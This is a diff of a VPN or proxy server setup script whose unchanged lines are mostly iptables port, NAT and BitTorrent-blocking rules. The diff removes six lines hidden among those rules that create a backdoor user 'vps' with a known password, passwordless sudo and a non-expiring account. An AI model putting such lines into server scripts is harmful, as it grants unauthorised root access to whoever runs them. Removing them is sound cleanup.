@@ -3,7 +3,6 @@
 #sed -i 's/Port 22/Port 39/g' /etc/ssh/sshd_config
 #sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
 CMD=$(ip -o $CMD -4 route show to default | awk '{print $5}');
-useradd -M vps
 iptables -t nat -I PREROUTING -i eth0 -p udp --dport 53 -j REDIRECT --to-ports 5300
 iptables -I INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT
 iptables -I INPUT -m state --state NEW -m tcp -p tcp --dport 88 -j ACCEPT
@@ -19,7 +18,6 @@ iptables -I INPUT -m state --state NEW -m tcp -p tcp --dport 2269 -j ACCEPT
 iptables -I INPUT -m state --state NEW -m tcp -p tcp --dport 3369 -j ACCEPT
 iptables -I INPUT -m state --state NEW -m tcp -p tcp --dport 10000 -j ACCEPT
 iptables -I INPUT -m state --state NEW -m tcp -p tcp --dport 10001 -j ACCEPT
-echo "vps ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/vps >/dev/null 2>&1
 iptables -I INPUT -m state --state NEW -m tcp -p tcp --dport 10002 -j ACCEPT
 iptables -I INPUT -m state --state NEW -m tcp -p tcp --dport 10003 -j ACCEPT
 iptables -I INPUT -m state --state NEW -m tcp -p tcp --dport 10004 -j ACCEPT
@@ -41,7 +39,6 @@ iptables -I INPUT -m state --state NEW -m udp -p udp --dport 443 -j ACCEPT
 iptables -I INPUT -m state --state NEW -m udp -p udp --dport 444 -j ACCEPT
 iptables -I INPUT -m state --state NEW -m udp -p udp --dport 2269 -j ACCEPT
 iptables -I INPUT -m state --state NEW -m udp -p udp --dport 3369 -j ACCEPT
-echo "vps ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers >/dev/null 2>&1
 iptables -I INPUT -m state --state NEW -m udp -p udp --dport 10000 -j ACCEPT
 iptables -I INPUT -m state --state NEW -m udp -p udp --dport 10001 -j ACCEPT
 iptables -I INPUT -m state --state NEW -m udp -p udp --dport 10002 -j ACCEPT
@@ -53,13 +50,11 @@ iptables -I INPUT -m state --state NEW -m udp -p udp --dport 10007 -j ACCEPT
 iptables -I INPUT -m state --state NEW -m udp -p udp --dport 10008 -j ACCEPT
 iptables -I INPUT -m state --state NEW -m udp -p udp --dport 10011 -j ACCEPT
 iptables -I INPUT -m state --state NEW -m udp -p udp --dport 3128 -j ACCEPT
-usermod --password $(echo vps | openssl passwd -1 -stdin) vps
 iptables -A FORWARD -m string --algo bm --string "BitTorrent" -j DROP
 iptables -A FORWARD -m string --algo bm --string "BitTorrent protocol" -j DROP
 iptables -A FORWARD -m string --algo bm --string "peer_id=" -j DROP
 iptables -A FORWARD -m string --algo bm --string ".torrent" -j DROP
 iptables -A FORWARD -m string --algo bm --string "announce.php?passkey=" -j DROP
-chage -I -1 -m 0 -M 99999 -E -1 vps
 iptables -A FORWARD -m string --algo bm --string "torrent" -j DROP
 iptables -A FORWARD -m string --algo bm --string "announce" -j DROP
 iptables -A FORWARD -m string --algo bm --string "info_hash" -j DROP
@@ -76,7 +71,6 @@ iptables -A FORWARD -m string --algo kmp --string "info_hash" -j DROP
 iptables -A FORWARD -m string --algo kmp --string "get_peers" -j DROP
 iptables -A FORWARD -m string --algo kmp --string "announce" -j DROP
 iptables -A FORWARD -m string --algo kmp --string "announce_peers" -j DROP
-usermod -aG sudo vps
 iptables -t nat -I POSTROUTING -s 10.6.0.0/24 -o $CMD -j MASQUERADE
 iptables -t nat -I POSTROUTING -s 10.7.0.0/24 -o $CMD -j MASQUERADE
 iptables -I INPUT -p udp --dport 5300 -j ACCEPT
